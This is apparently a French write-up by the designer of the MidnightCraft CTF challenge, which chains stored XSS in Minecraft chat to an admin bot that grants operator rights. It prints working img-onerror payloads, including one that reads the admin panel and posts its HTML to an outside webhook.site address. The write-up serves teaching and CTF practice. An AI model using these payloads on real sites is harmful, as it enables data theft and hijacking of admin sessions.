@@ -1,0 +1,120 @@
+---
+year: 2025
+title: 'MidnightCraft — Challenge CTF (XSS via Chat Minecraft)'
+htmlTitle: 'MidnightCraft — CTF\nXSS via Chat Minecraft'
+description: 'Challenge CTF conçu pour le Midnight Flag CTF 2025. XSS stocké injecté via le chat Minecraft → exploitation d''un bot admin Python Flask → /op indirect (flag). 8 solves sur 600 équipes.'
+heroImage: 'https://images.unsplash.com/photo-1544197150-b99a580bb7a8?q=80&w=2832&auto=format&fit=crop'
+heroImageAlign: 'center'
+universe: 'security'
+tags:
+  - Conception CTF
+  - XSS Stocké
+  - Admin Bot
+  - Python Flask
+  - Flask-SocketIO
+  - MCRcon
+  - Minecraft
+  - WebSocket
+  - Sécurité Web
+---
+
+## Contexte
+
+**Événement** : Midnight Flag CTF 2025  
+**Auteur** : BIEN_SUR (Sylvain Costes)  
+**Catégorie** : Misc / Web  
+**Solves** : 8 / 600 équipes · 484 pts  
+**Writeup de participants** : [alanoo.dev — MidnightCraft writeup](https://alanoo.dev/writeups/midnightflag-2025/midnightcraft)
+
+MidnightCraft relie deux mondes : un serveur de jeu Minecraft custom et un panel web admin authentifié. L'objectif : obtenir les **privilèges opérateur** sur le serveur Minecraft pour pouvoir exécuter `/flag` — une commande custom ajoutée par le plugin `MidnightFlagCTF` qui affiche le flag uniquement aux ops.
+
+---
+
+## Setup du challenge
+
+Les participants se connectent à un serveur Minecraft avec un plugin custom appelé **MidnightFlagCTF**. Le plugin expose deux commandes : `/discord` (inoffensif) et `/flag` (nécessite opérateur — l'objectif). Il relaie aussi le chat en jeu vers un site de showcase public en temps réel via **WebSocket**.
+
+Le site dispose de deux surfaces clés :
+- Un **flux de chat public** affichant les messages Minecraft en temps réel
+- Un **panel admin** protégé par login (`/panel`) avec une console serveur Minecraft — un champ texte qui envoie des commandes directement au serveur
+
+Il existe aussi un bouton **"Signaler un comportement abusif"**. Son handler côté client appelle `GET /report`, ce qui déclenche un bot Python pour ouvrir la page `/panel` en tant qu'admin authentifié et "examiner" les derniers messages.
+
+---
+
+## La chaîne d'attaque
+
+```
+[Joueur tape dans le chat Minecraft]
+            │
+            │  Plugin Java relaie le message via WebSocket (sans sanitisation)
+            ▼
+[Site public rend le message en HTML]
+            │
+            │  Payload XSS stocké s'exécute quand le bot visite /panel
+            ▼
+[Bot Playwright ouvre /panel — session admin authentifiée]
+            │
+            │  Payload XSS interagit avec l'input console (#cmd / #cmd_btn)
+            ▼
+[Le bot envoie "/op [nom_joueur]" au serveur Minecraft]
+            │
+            ▼
+[Le joueur est maintenant opérateur → exécute /flag → obtient le flag]
+```
+
+---
+
+## Étape 1 — Confirmer le XSS dans le flux de chat
+
+Le chat Minecraft est rendu sur le site sans sanitisation. Injecter une balise `<img>` avec un handler `onerror` via le chat en jeu confirme l'exécution :
+
+```
+<img src=x onerror="alert(1)">
+```
+
+Une balise `<script>` simple ne fonctionnait pas (les scripts injectés via innerHTML ne sont pas exécutés par les navigateurs), mais le vecteur `<img onerror>` s'est déclenché immédiatement.
+
+---
+
+## Étape 2 — Reconnaissance : extraire le HTML du panel admin
+
+Avec le XSS confirmé, l'étape suivante est de comprendre à quoi ressemble la page `/panel` — inaccessible directement car protégée par login. Le payload de reconnaissance (envoyé via le chat) :
+
+```html
+<img src=x onerror="
+  fetch('/panel')
+    .then(r => r.text())
+    .then(html => fetch('https://webhook.site/[token]', {
+      method: 'POST',
+      body: html
+    }))
+">
+```
+
+---
+
+## Étape 3 — Payload final
+
+Une fois la structure du panel connue (champ `#cmd` et bouton `#cmd_btn`), le payload final :
+
+```html
+<img src=x onerror="
+  fetch('/panel')
+    .then(() => {
+      document.querySelector('#cmd').value = '/op TON_PSEUDO';
+      document.querySelector('#cmd_btn').click();
+    })
+">
+```
+
+---
+
+## Pourquoi seulement 8 solves ?
+
+Le challenge était intentionnellement difficile :
+1. La plupart des participants ont essayé des injections directes de commandes (`/op` direct, SQLi)
+2. Peu ont pensé à exploiter le bot admin via le chat Minecraft
+3. Le délai entre l'envoi du message et la visite du bot créait de la confusion
+
+Un bon challenge CTF force à penser de façon non-linéaire. Celui-ci demandait de relier un jeu vidéo, une faille web, et un bot automatisé — trois domaines qu'on pense rarement ensemble.
